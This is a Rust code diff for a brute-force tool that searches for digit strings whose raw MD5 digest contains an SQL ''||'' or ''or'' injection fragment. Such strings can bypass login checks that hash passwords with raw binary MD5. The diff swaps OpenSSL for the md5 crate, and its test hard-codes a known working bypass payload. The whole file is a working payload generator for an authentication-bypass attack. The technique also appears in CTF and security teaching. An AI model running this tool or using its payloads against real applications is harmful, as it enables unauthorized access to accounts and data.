@@ -1,21 +1,17 @@
-#![warn(clippy::all)]
-#![warn(clippy::pedantic)]
-#![warn(clippy::nursery)]
-
+use md5::{
+    digest::{core_api::CoreWrapper, FixedOutputReset, Output},
+    Digest, Md5, Md5Core,
+};
 use once_cell::sync::Lazy;
-use openssl::{md::Md, md_ctx::MdCtx};
 use rand::{distributions, thread_rng, Rng};
 use regex::bytes::Regex;
 
-type Digest = [u8; 32];
-
 /// Regex to detect an escape, followed by an OR pattern, followed by another opening single quote then a digit
 /// This is significantly faster than the previous string search method.
-// TODO: Find how stop this from being SYNC, as taking the lock wastes a lot of time.
 static INJECTION_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"'(\|\||or)'\d").unwrap());
 
 #[inline]
-fn byte_validate(digest: &Digest) -> bool {
+fn byte_validate(digest: &[u8]) -> bool {
     INJECTION_REGEX.is_match(digest)
 }
 
@@ -29,11 +25,10 @@ fn crack() {
     // Create all in memory objects here to reduce re-allocation.
     let mut i = 0;
     let mut buf = String::with_capacity(400);
-    let mut digest: Digest = [0; 32];
     // Ascii codes for digits.
     let uniform_ascii_digits = distributions::Uniform::from(48..=57);
-    let mut ctx = MdCtx::new().unwrap();
     // Distribution for selecting random
+    let mut hasher = Md5::new();
     loop {
         if i % 1_000_000 == 0 {
             println!("i = {i}");
@@ -44,7 +39,7 @@ fn crack() {
             return;
         }
 
-        if i & 100 == 0 {
+        if i % 100 == 0 {
             buf.clear();
         }
 
@@ -58,37 +53,42 @@ fn crack() {
         }
 
         // Calculate md5 hash
-        // let str_digest = openssl_str_digest(&buf, &mut digest);
-        openssl_digest(&mut ctx, &buf, &mut digest);
+        let gen_digest = rust_digest(&mut hasher, &buf);
+        let digest = gen_digest.as_slice();
 
         // Check if we can create the OR statement from it.
-        if byte_validate(&digest) {
+        if byte_validate(digest) {
             println!("Found! i = {i}");
             println!("Content = {buf}");
-            let str_digest = String::from_utf8_lossy(&digest);
+            let str_digest = String::from_utf8_lossy(digest);
             println!("Raw md5 Hash = {str_digest}");
             return;
         }
     }
 }
 
-#[inline]
-fn openssl_digest(ctx: &mut MdCtx, buf: &str, digest: &mut [u8; 32]) {
-    ctx.digest_init(Md::md5()).unwrap();
-    ctx.digest_update(buf.as_bytes()).unwrap();
-    ctx.digest_final(digest).unwrap();
+fn rust_digest(hasher: &mut Md5, buf: &str) -> Output<CoreWrapper<Md5Core>> {
+    hasher.update(buf);
+    hasher.finalize_fixed_reset()
 }
 
-#[test]
-fn test_validation() {
-    let buf = "129581926211651571912466741651878684928";
+#[cfg(test)]
+mod test {
 
-    let mut digest = [0; 32];
-    let mut ctx = MdCtx::new().unwrap();
+    use crate::{byte_validate, rust_digest};
 
-    openssl_digest(&mut ctx, buf, &mut digest);
+    use md5::{Digest, Md5};
 
-    let str_digest = String::from_utf8_lossy(&digest);
-    println!("{str_digest}");
-    assert!(byte_validate(&digest));
+    const BUF: &str = "129581926211651571912466741651878684928";
+
+    #[test]
+    fn test_rust_md5_validation() {
+        let mut hasher = Md5::new();
+
+        let raw_digest = rust_digest(&mut hasher, BUF);
+        let digest = raw_digest.as_slice();
+        let str_digest = String::from_utf8_lossy(digest);
+        println!("{str_digest}");
+        assert!(byte_validate(digest));
+    }
 }
